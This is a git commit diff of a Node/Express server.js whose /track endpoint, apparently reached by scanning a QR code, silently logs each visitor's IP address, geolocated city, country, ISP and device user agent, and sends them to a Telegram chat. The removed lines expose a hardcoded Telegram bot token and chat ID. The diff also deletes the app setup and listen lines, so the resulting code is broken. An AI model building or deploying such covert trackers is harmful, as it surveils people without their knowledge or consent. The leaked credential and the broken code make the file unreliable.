93c6ec7a93bfc08d0026a2e3a4f901d19dbb7946
fahriy <44180175+fahriy@users.noreply.github.com>
2026-04-25 23:41:50 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,33 +1,33 @@
-const express = require("express");
-const app = express();
-
-app.use(express.json());
-
-const BOT = "8381262942:AAGb0yeCVcl4-IPL_dAhxm7lOjdE7DEKTaA";
-const CHAT = "8706199771";
-
 app.get("/track", async (req, res) => {
 
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const ua = req.headers["user-agent"];
 
   const geo = await fetch(`https://ipapi.co/${ip}/json/`)
     .then(r => r.json())
     .catch(() => ({}));
 
-  await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+  const msg = `
+🚗 QR TARANDI
+
+🌍 IP: ${ip}
+📍 Şehir: ${geo.city || "-"}
+🌎 Ülke: ${geo.country_name || "-"}
+📡 ISP: ${geo.org || "-"}
+
+📱 Cihaz: ${ua}
+
+⏰ Saat: ${new Date().toLocaleString()}
+`;
+
+  await fetch(`https://api.telegram.org/botTOKEN/sendMessage`, {
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({
-      chat_id: CHAT,
-      text:
-`🚗 QR TARANDI
-IP: ${ip}
-Şehir: ${geo.city || "unknown"}
-Ülke: ${geo.country_name || "unknown"}`
+      chat_id: "CHAT_ID",
+      text: msg
     })
   });
 
   res.send("OK");
 });
-
-app.listen(3000);
